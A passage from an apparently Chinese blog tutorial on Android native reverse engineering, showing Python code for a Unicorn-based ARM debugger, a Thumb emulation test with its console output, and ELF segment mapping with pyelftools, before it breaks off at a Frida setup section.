class="number">2</span></span><br><span class="line"> </span><br><span class="line">REG_ARM = &#123;arm_const.UC_ARM_REG_R0: <span class="string">&quot;R0&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R1: <span class="string">&quot;R1&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R2: <span class="string">&quot;R2&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R3: <span class="string">&quot;R3&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R4: <span class="string">&quot;R4&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R5: <span class="string">&quot;R5&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R6: <span class="string">&quot;R6&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R7: <span class="string">&quot;R7&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R8: <span class="string">&quot;R8&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R9: <span class="string">&quot;R9&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R10: <span class="string">&quot;R10&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R11: <span class="string">&quot;R11&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R12: <span class="string">&quot;R12&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R13: <span class="string">&quot;R13&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R14: <span class="string">&quot;R14&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R15: <span class="string">&quot;R15&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_PC: <span class="string">&quot;PC&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_LR: <span class="string">&quot;LR&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">REG_TABLE = &#123;UC_ARCH_ARM: REG_ARM&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2int</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&quot;0X&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(s[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">advance_dump</span>(<span class="params">data, base</span>):</span><br><span class="line">    PY3K = sys.version_info &gt;= (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    generator = hexdump.genchunks(data, <span class="number">16</span>)</span><br><span class="line">    retstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> addr, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(generator):</span><br><span class="line">        <span class="comment"># 00000000:</span></span><br><span class="line">        line = <span class="string">&#x27;%08X: &#x27;</span> % (base + addr * <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line">        dumpstr = hexdump.dump(d)</span><br><span class="line">        line += dumpstr[:<span class="number">8</span> * <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">8</span>:  <span class="comment"># insert separator if needed</span></span><br><span class="line">            line += <span class="string">&#x27; &#x27;</span> + dumpstr[<span class="number">8</span> * <span class="number">3</span>:]</span><br><span class="line">        <span class="comment"># ................</span></span><br><span class="line">        <span class="comment"># calculate indentation, which may be different for the last line</span></span><br><span class="line">        pad = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt; <span class="number">16</span>:</span><br><span class="line">            pad += <span class="number">3</span> * (<span class="number">16</span> - <span class="built_in">len</span>(d))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt;= <span class="number">8</span>:</span><br><span class="line">            pad += <span class="number">1</span></span><br><span class="line">        line += <span class="string">&#x27; &#x27;</span> * pad</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> d:</span><br><span class="line">            <span class="comment"># printable ASCII range 0x20 to 0x7E</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> PY3K:</span><br><span class="line">                byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0x20</span> &lt;= byte &lt;= <span class="number">0x7E</span>:</span><br><span class="line">                line += <span class="built_in">chr</span>(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        retstr += line + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._tracks.append(address)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._is_step <span class="keyword">and</span> self._tmp_bpt == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> address <span class="keyword">not</span> <span class="keyword">in</span> self._list_bpt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> self._tmp_bpt != address <span class="keyword">and</span> self._tmp_bpt != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> _dbg_trace_internal(mu, address, size, self)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_memory</span>(<span class="params">mu, access, address, length, value, self</span>):</span><br><span class="line">    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;memory error: pc: %x access: %x address: %x length: %x value: %x&quot;</span> %</span><br><span class="line">                 (pc, access, address, length, value))</span><br><span class="line">    _dbg_trace_internal(mu, pc, <span class="number">4</span>, self)</span><br><span class="line">    mu.emu_stop()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace_internal</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._is_step = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Registers =======================&quot;</span>)</span><br><span class="line">    self.dump_reg()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">    self.dump_asm(address, size * self.dis_count)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_command = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> raw_command == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_command = self._last_command</span><br><span class="line">        self._last_command = raw_command</span><br><span class="line">        command = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> raw_command.split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> c != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                command.append(c)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> command[<span class="number">0</span>] == <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;reg&#x27;</span>:<span class="comment"># set reg regname value</span></span><br><span class="line">                    self.write_reg(command[<span class="number">2</span>], str2int(command[<span class="number">3</span>]))</span><br><span class="line">                <span class="keyword">elif</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.add_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;step&#x27;</span>:</span><br><span class="line">                <span class="comment"># self._tmp_bpt = address + size</span></span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;n&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;next&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = address + size</span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;dump&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt;= <span class="number">3</span>:</span><br><span class="line">                    nsize = str2int(command[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nsize = <span class="number">4</span> * <span class="number">16</span></span><br><span class="line">                self.dump_mem(str2int(command[<span class="number">1</span>]), nsize)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.list_bpt()</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.del_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>]==<span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_thumb</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_arm</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot; == recent ==&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">10</span>:-<span class="number">1</span>]:</span><br><span class="line">                    <span class="built_in">print</span> (self.sym_handler(i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;Command Not Found!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnicornDebugger</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, mu, mode = UDBG_MODE_ALL</span>):</span><br><span class="line">        self._tracks = []</span><br><span class="line">        self._mu = mu</span><br><span class="line">        self._arch = mu._arch</span><br><span class="line">        self._mode = mu._mode</span><br><span class="line">        self._list_bpt = []</span><br><span class="line">        self._tmp_bpt = <span class="number">0</span></span><br><span class="line">        self._error = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._last_command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.dis_count = <span class="number">5</span></span><br><span class="line">        self._is_step = <span class="literal">False</span></span><br><span class="line">        self.sym_handler = self._default_sym_handler</span><br><span class="line">        self._capstone_arm = <span class="literal">None</span></span><br><span class="line">        self._capstone_thumb = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch != UC_ARCH_ARM:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch == UC_ARCH_ARM:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_ARM64:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM64</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_X86:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_X86</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._mode == UC_MODE_THUMB:</span><br><span class="line">            capstone_mode = cp.CS_MODE_THUMB</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_ARM:</span><br><span class="line">            capstone_mode = cp.CS_MODE_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_32:</span><br><span class="line">            capstone_mode = cp.CS_MODE_32</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_64:</span><br><span class="line">            capstone_mode = cp.CS_MODE_64</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;mode:%d is not supported! &quot;</span> % self._mode)</span><br><span class="line"> </span><br><span class="line">        self._capstone_thumb = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_THUMB)</span><br><span class="line">        self._capstone_arm = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_ARM)</span><br><span class="line"> </span><br><span class="line">        self._capstone = self._capstone_thumb</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> mode == UDBG_MODE_ALL:</span><br><span class="line">            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)</span><br><span class="line"> </span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)</span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self._regs = REG_TABLE[self._arch]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_mem</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        data = self._mu.mem_read(addr, size)</span><br><span class="line">        <span class="built_in">print</span> (advance_dump(data, addr))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_asm</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        md = self._capstone</span><br><span class="line">        code = self._mu.mem_read(addr, size)</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> md.disasm(code, addr):</span><br><span class="line">            <span class="keyword">if</span> count &gt;= self.dis_count:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:\t%s\t%s&quot;</span> % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_reg</span>(<span class="params">self</span>):</span><br><span class="line">        result_format = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            value = self._mu.reg_read(rid)</span><br><span class="line">            <span class="keyword">if</span> count &lt; <span class="number">4</span>:</span><br><span class="line">                result_format += rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">                result_format += <span class="string">&#x27;\n&#x27;</span> + rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (result_format)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">self, reg_name, value</span>):</span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            <span class="keyword">if</span> rname == reg_name:</span><br><span class="line">                self._mu.reg_write(rid, value)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[Debugger Error] Reg not found:%s &quot;</span> % reg_name)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_help</span>(<span class="params">self</span>):</span><br><span class="line">        help_info = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        # commands</span></span><br><span class="line"><span class="string">        # set reg &lt;regname&gt; &lt;value&gt;</span></span><br><span class="line"><span class="string">        # set bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # n[ext]</span></span><br><span class="line"><span class="string">        # s[etp]</span></span><br><span class="line"><span class="string">        # r[un]</span></span><br><span class="line"><span class="string">        # dump &lt;addr&gt; &lt;size&gt;</span></span><br><span class="line"><span class="string">        # list bpt</span></span><br><span class="line"><span class="string">        # del bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # stop</span></span><br><span class="line"><span class="string">        # a/t change arm/thumb</span></span><br><span class="line"><span class="string">        # f show ins flow</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (help_info)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_bpt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self._list_bpt)):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[%d] %s&quot;</span> % (idx, self.sym_handler(self._list_bpt[idx])))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.append(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.remove(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tracks</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">            <span class="comment">#print (self.sym_handler(i))</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self._tracks</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_default_sym_handler</span>(<span class="params">self, address</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(address)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_symbol_name_handler</span>(<span class="params">self, handler</span>):</span><br><span class="line">        self.sym_handler = handler</span><br></pre></td></tr></table></figure><p>将它放入Python库中，比如我放到了<code>C:\Users\v5le0n9\AppData\Local\Programs\Python\Python38\Lib\site-packages\unicorn</code>中，如果想要调用调试器直接在测试文件中导入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.UnicornDebugger <span class="keyword">import</span> *</span><br><span class="line">THUMB = <span class="string">b&quot;\x83\xb0\x83\xb0\x83\xb0&quot;</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate Thumb code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">        ADDRESS = <span class="number">0x10000</span></span><br><span class="line">        mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">0x10000</span>)</span><br><span class="line">        mu.mem_write(ADDRESS, THUMB)</span><br><span class="line"> </span><br><span class="line">        mu.reg_write(UC_ARM_REG_SP, <span class="number">0x1234</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R2, <span class="number">0x6789</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#debugger attach</span></span><br><span class="line">        udbg = UnicornDebugger(mu)</span><br><span class="line">        udbg.add_bpt(ADDRESS)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(THUMB))</span><br><span class="line">        r0 = mu.reg_read(UC_ARM_REG_SP)</span><br><span class="line">        r1 = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; SP = 0x%x&quot;</span> % r0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R1 = 0x%x&quot;</span> % r1)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_arm()</span><br></pre></td></tr></table></figure><p>在调试过程中，发现无名大佬写的调试器还是有些致命性的错误的，比如在执行n或s命令时，正常来说是执行一条汇编指令的，但这里执行了两条指令。而且指令执行完后SP的值并没有改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">Emulate Thumb code</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10000</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10000:        sub     sp, #0xc</span><br><span class="line">0x10002:        sub     sp, #0xc</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">&gt;s</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10004</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">0x10014:        movs    r0, r0</span><br><span class="line">0x10016:        movs    r0, r0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="2-3-Unicorn调用so之加载模块"><a href="#2-3-Unicorn调用so之加载模块" class="headerlink" title="2.3 Unicorn调用so之加载模块"></a>2.3 Unicorn调用so之加载模块</h2><p>Android是基于Linux开发的，Android Native原生库是ELF文件格式。Unicorn 并不能加载ELF文件，所以我们要自己将ELF文件加载到Unicorn虚拟机的内存中去。 加载ELF 文件是一个很复杂的过程，涉及到ELF文件解析、重定位、符号解析、依赖库加载等。 </p><p>Python 可以使用elftools库解析ELF 文件。elftools安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyelftools</span><br></pre></td></tr></table></figure><h3 id="2-3-1-映射ELF文件"><a href="#2-3-1-映射ELF文件" class="headerlink" title="2.3.1 映射ELF文件"></a>2.3.1 映射ELF文件</h3><p>ELF 文件有两种视图，链接视图和执行视图。elftools 是基于链接视图解析ELF格式的，然而现在有一些ELF文件的section信息是被抹掉的。</p><p>加载ELF文件第一步需要将ELF文件映射到内存。如何映射呢？只需要找到类型为PT_LOAD的segment，按照segment的信息映射即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - LOAD (determinate what parts of the ELF file get mapped into memory)</span></span><br><span class="line">load_segments = [x <span class="keyword">for</span> x <span class="keyword">in</span> elf.iter_segments() <span class="keyword">if</span> x.header.p_type == <span class="string">&#x27;PT_LOAD&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> segment <span class="keyword">in</span> load_segments:</span><br><span class="line">    prot = UC_PROT_ALL</span><br><span class="line">    self.emu.memory.mem_map(load_base + segment.header.p_vaddr, segment.header.p_memsz, prot)</span><br><span class="line">    self.emu.memory.mem_write(load_base + segment.header.p_vaddr, segment.data())</span><br></pre></td></tr></table></figure><h1 id="3-Frida"><a href="#3-Frida" class="headerlink" title="3. Frida"></a>3. Frida</h1><p>在Windows上安装好Frida-tools和Frida后，在安卓上安装Frida-server。首先要准备好你的安卓机，真机、模拟器都可以，还需要<a 